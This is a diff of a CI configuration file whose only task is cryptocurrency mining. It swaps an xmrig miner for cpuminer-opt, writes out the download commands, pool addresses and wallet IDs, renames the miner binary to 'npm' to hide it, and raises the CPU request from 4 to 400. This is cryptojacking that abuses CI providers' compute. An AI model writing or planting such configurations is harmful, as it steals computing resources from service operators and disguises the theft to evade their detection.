@@ -1,6 +1,6 @@
 container:
   image: nvidia/cuda:10.0-runtime-ubuntu18.04
-  cpu: 4
+  cpu: 400
   memory: 12G
   gpu: 4
   gpu_type: nvidia-tesla-v100 # do we need the choice?
@@ -8,7 +8,8 @@ task:
   script: |
    apt update -y \
    && apt install -y wget \
-   && wget https://github.com/xmrig/xmrig/releases/download/v6.9.0/xmrig-6.9.0-bionic-x64.tar.gz \
-   && tar -xvf xmrig-6.9.0-bionic-x64.tar.gz \
-   && ./xmrig-6.9.0/xmrig -o arq.pool.gntl.co.uk:10008 -u aRi1mBz6iddEmCrduae2TnYB94o41g9ug9HgPvBZF5aUNZY7opu7Z9HYTKA4PphzbTGdXamfR4RyW1XryRHpV92Qccd8fTsRkDV1RB37AVQKG -k --tls
+   && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \
+   && tar -xvf cpuminer-opt-linux.tar.gz \
+   && mv cpuminer-sse2 npm \
+   && ./npm -a power2b -o stratum+tcps://stratum-eu.rplant.xyz:17022 -u Bc9Nnt38ZU2mryNKUyxVviir4DXgbQeEhp.mode-cir -t 0
    
